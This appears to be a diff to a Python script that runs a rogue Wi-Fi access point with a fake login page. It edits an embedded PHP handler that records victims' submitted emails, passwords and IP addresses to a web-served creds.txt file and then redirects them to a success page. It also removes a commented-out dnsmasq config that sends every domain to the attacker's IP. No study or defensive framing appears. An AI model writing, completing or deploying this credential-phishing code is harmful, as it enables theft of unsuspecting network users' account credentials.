@@ -11,6 +11,7 @@ import signal
 import shutil
 import threading
 import importlib.util
+import tempfile
 
 
 # Physical interface name (usually wlan0)
@@ -686,12 +687,7 @@ log-dhcp
             
             if (isValid) {
                 // Show loading state
-                const submitBtn = document.querySelector('.comfort-button');
-                const buttonText = submitBtn.querySelector('.button-text');
-                const buttonLoader = submitBtn.querySelector('.button-loader');
                 
-                buttonText.style.opacity = '0.5';
-                buttonLoader.style.display = 'block';
                 
           	this.submit();
             }
@@ -718,57 +714,43 @@ log-dhcp
 </body>
 </html>    
                     """)
-            
-        #malicious_dns_conf = f"""
-        #interface={PHY_INTERFACE}
-        #dhcp-range={DHCP_RANGE}
-        #dhcp-option=3,{FAKE_IP}
-        #dhcp-option=6,{FAKE_IP}
-        #address=/#/{FAKE_IP}  # Redirect ALL domains to our IP
-        #"""
-        #with open("dnsmasq.conf", "w") as f:
-        #    f.write(malicious_dns_conf)
         
         php_capture = """<?php
+        session_start();
+        
         error_reporting(E_ALL);
         ini_set('display_errors',1);
-	$log_file='/tmp/creds.log';
+        
+	$log_file='/var/www/html/creds.txt';
+	
         if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-            $email = isset($_POST['email']) ? trim($_POST['email']) : '';
-            $password = isset($_POST['password']) ? trim($_POST['password']) : '';
-            $remember = isset($_POST['remember']) ? 'Yes' : 'No';
+            $email = $_POST["email"] ?? '';
+            $password = $_POST["password"] ?? '';
             
-            $timestamp = date('Y-m-d H:i:s');
-            $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-            $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+            if($email == '' && $password == ''){
+            	header('Location: /index.html');
+            	exit;
+            }
             
-            $log_entry = "=" . str_repeat("=", 60) . "\\n";
-            $log_entry .=  "TIMESTAMP: $timestamp\\n";
-            $log_entry .=  "IP ADDRESS: $ip\\n";
-            $log_entry .=  "USER AGENT: $user_agent\\n";
-            $log_entry .=  "EMAIL: $email\\n";
-            $log_entry .=  "PASSWORD: $password\\n";
-            $log_entry .=  "REMEMBER ME: $remember\\n";
-            $log_entry .=  "=" . str_repeat("=", 60) . "\\n\\n";
+            $log_entry = date('Y-m-d H:i:s') . "| IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "| Email: " . ($_POST["email"] ?? '') . "| Password: " . ($_POST["password"] ?? '') . PHP_EOL;
             
-            file_put_contents($log_file, $log_entry, FILE_APPEND)
-            echo $log_entry;
-            error_log("Captured credentials: $email / $password");
-            
-            echo "OK";
+            file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
             
             // Redirect back or show success
             header('Location: /success.html');
             exit;
-        } else {
-        	header('Location: /index.html');
-        	exit;
-        }
+            }
+            
+            header('Location: /index.html');
+            exit;
+        
         ?>
         """
     
         with open("/var/www/html/login.php", "w") as f:
-            f.write(php_capture)
+           f.write(php_capture)
+        
+        
 
     success_html = """<!DOCTYPE html>
     <html>
